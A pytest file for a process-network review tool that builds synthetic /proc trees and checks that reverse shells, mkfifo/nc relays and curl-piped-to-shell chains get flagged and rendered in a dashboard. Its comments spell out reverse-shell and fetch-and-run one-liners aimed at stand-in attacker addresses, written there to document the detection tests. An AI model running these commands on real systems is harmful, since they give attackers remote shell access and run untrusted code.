"""Reverse-shell shapes in the process network review, over synthetic /proc trees."""
import json
import os
from pathlib import Path
import shutil
import subprocess

import pytest

from megalodon import process_network
from megalodon.dashboard_process_network import PROCESS_NETWORK_JS
from test_process_network import UID, row, tables  # noqa: F401

NOW = lambda: "2026-11-18T08:00:00Z"
ATTACKER = ("203.0.113.66", 4444)


def process(root, pid, exe, fds, comm=None):
    """fds maps descriptor number to 'socket:N', 'pipe:N' or a path."""
    base = root / "proc" / str(pid)
    (base / "fd").mkdir(parents=True)
    os.symlink(exe, base / "exe")
    name = comm or exe.rsplit("/", 1)[-1].removesuffix(" (deleted)")
    (base / "comm").write_text(name + "\n")
    (base / "stat").write_text(f"{pid} ({name}) S 1 1 1 0\n")
    for number, target in fds.items():
        kind, _, value = target.partition(":")
        link = f"{kind}:[{value}]" if kind in ("socket", "pipe") else target
        os.symlink(link, base / "fd" / str(number))


def flags(result):
    return {p["executable"]: p["flags"] for p in result["programs"]}


@pytest.fixture
def root(tmp_path):
    tables(tmp_path, tcp=[
        row(("192.168.1.5", 51000), ATTACKER, "01", 501),        # reverse shell socket
        row(("192.168.1.5", 51001), ATTACKER, "01", 502),        # /dev/tcp on fd 3
        row(("192.168.1.5", 51002), ATTACKER, "01", 503),        # mkfifo relay's nc
        row(("192.168.1.5", 51003), ("198.51.100.7", 443), "01", 504),  # curl | sh
        row(("192.168.1.5", 51004), ("198.51.100.8", 443), "01", 505),  # ordinary browser
        row(("0.0.0.0", 2222), ("0.0.0.0", 0), "0A", 506),        # a listening shell socket
        row(("192.168.1.5", 51005), ("198.51.100.9", 8080), "01", 507),  # python app, stdio tty
        row(("192.168.1.5", 51006), ("198.51.100.10", 9000), "01", 508),  # inetd-style service
    ])
    (tmp_path / "proc/1").mkdir(parents=True)
    (tmp_path / "proc/1/comm").write_text("systemd\n")
    return tmp_path


def test_classic_reverse_shell_stdio_is_the_socket(root):
    # bash -i >& /dev/tcp/203.0.113.66/4444 0>&1
    process(root, 100, "/usr/bin/bash", {0: "socket:501", 1: "socket:501", 2: "socket:501"})
    # python -c 'import pty,socket,os; s=...; [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("sh")'
    process(root, 101, "/usr/bin/python3.12", {0: "socket:501", 1: "socket:501", 3: "socket:501"})
    result = process_network.review(root, uid=UID, now=NOW)
    assert flags(result)["/usr/bin/bash"] == ["STDIO_SHELL_ON_NETWORK"]
    assert flags(result)["/usr/bin/python3.12"] == ["STDIO_SHELL_ON_NETWORK"]
    assert result["flagged_total"] == 2


def test_shell_holding_a_dev_tcp_socket(root):
    process(root, 110, "/usr/bin/bash", {0: "/dev/pts/3", 1: "/dev/pts/3", 3: "socket:502"})
    assert flags(process_network.review(root, uid=UID, now=NOW))["/usr/bin/bash"] == ["SHELL_HOLDS_SOCKET"]


def test_mkfifo_relay_and_curl_pipe_into_a_shell(root):
    # rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.0.113.66 4444 > /tmp/f
    process(root, 120, "/usr/bin/dash", {0: "pipe:900", 1: "pipe:901", 2: "pipe:901"}, comm="sh")
    process(root, 121, "/usr/bin/nc.openbsd", {0: "pipe:901", 1: "/tmp/f", 3: "socket:503"}, comm="nc")
    # curl https://198.51.100.7/install.sh | sh
    process(root, 130, "/usr/bin/curl", {1: "pipe:910", 3: "socket:504"})
    process(root, 131, "/usr/bin/sh", {0: "pipe:910", 1: "/dev/pts/1"})
    result = flags(process_network.review(root, uid=UID, now=NOW))
    assert result["/usr/bin/nc.openbsd"] == ["PIPED_TO_SHELL"]
    assert result["/usr/bin/curl"] == ["PIPED_TO_SHELL"]


def test_everyday_programs_stay_quiet(root):
    # A browser, a shell in a terminal, a listening socket, an app writing to a pipe a non-shell reads.
    process(root, 140, "/usr/lib/firefox/firefox", {0: "/dev/null", 3: "socket:505"}, comm="firefox")
    process(root, 141, "/usr/bin/bash", {0: "/dev/pts/0", 1: "/dev/pts/0", 2: "/dev/pts/0"})
    process(root, 142, "/usr/bin/zsh", {0: "/dev/pts/2", 3: "socket:506"})       # listening only
    process(root, 143, "/usr/bin/python3.12", {0: "/dev/pts/4", 1: "pipe:920", 3: "socket:507"})
    process(root, 144, "/usr/bin/less", {0: "pipe:920", 1: "/dev/pts/4"})
    result = process_network.review(root, uid=UID, now=NOW)
    assert result["flagged_total"] == 0, flags(result)


def test_non_shell_with_network_stdio_is_a_milder_flag(root):
    process(root, 150, "/usr/local/bin/echo-service", {0: "socket:508", 1: "socket:508"})
    assert flags(process_network.review(root, uid=UID, now=NOW))["/usr/local/bin/echo-service"] == [
        "STDIO_ON_NETWORK"]


def test_busybox_and_deleted_shells_are_still_shells(root):
    process(root, 160, "/bin/busybox", {0: "socket:501", 1: "socket:501"}, comm="sh")
    process(root, 161, "/tmp/.x/bash (deleted)", {0: "socket:501"}, comm="bash")
    result = flags(process_network.review(root, uid=UID, now=NOW))
    assert result["/bin/busybox"] == ["STDIO_SHELL_ON_NETWORK"]
    assert result["/tmp/.x/bash"] == ["EXECUTABLE_DELETED", "EXECUTABLE_IN_TEMPORARY",
                                      "STDIO_SHELL_ON_NETWORK"]


def test_reverse_shell_rows_render_in_the_hud(root):
    if not shutil.which("node"):
        pytest.skip("Node unavailable")
    process(root, 100, "/usr/bin/bash", {0: "socket:501", 1: "socket:501"})
    process(root, 120, "/usr/bin/dash", {0: "pipe:900"}, comm="sh")
    process(root, 121, "/usr/bin/nc", {1: "pipe:900", 3: "socket:503"})
    # Executable flags combine with reverse-shell flags; the whole review must still render.
    process(root, 161, "/tmp/.x/bash (deleted)", {0: "socket:501"}, comm="bash")
    result = process_network.review(root, uid=UID, now=NOW)
    assert max(len(row["flags"]) for row in result["programs"]) == 3
    script = PROCESS_NETWORK_JS + """
const input=JSON.parse(require('fs').readFileSync(0,'utf8'));
function el(){const n={textContent:'',children:[],dataset:{},append(...x){this.children.push(...x);},replaceChildren(...x){this.children=x;}};return n;}
const document={createElement:el};globalThis.document=document;
if(!validProcessNetwork(input))throw Error('rejected');
const panel=el();renderProcessNetwork(panel,input);
const text=n=>n.textContent+' '+n.children.map(text).join(' ');process.stdout.write(text(panel));"""
    out = subprocess.run([shutil.which("node"), "-e", script], input=json.dumps(result),
                         capture_output=True, text=True, timeout=10)
    assert out.returncode == 0, out.stderr
    assert "Possible reverse shell: shell input/output on the network · ATT&CK T1059" in out.stdout
    assert "Network connection piped into a shell · ATT&CK T1059.004" in out.stdout
    assert "Program file deleted" in out.stdout and "Program in a temporary folder" in out.stdout
    assert "undefined" not in out.stdout
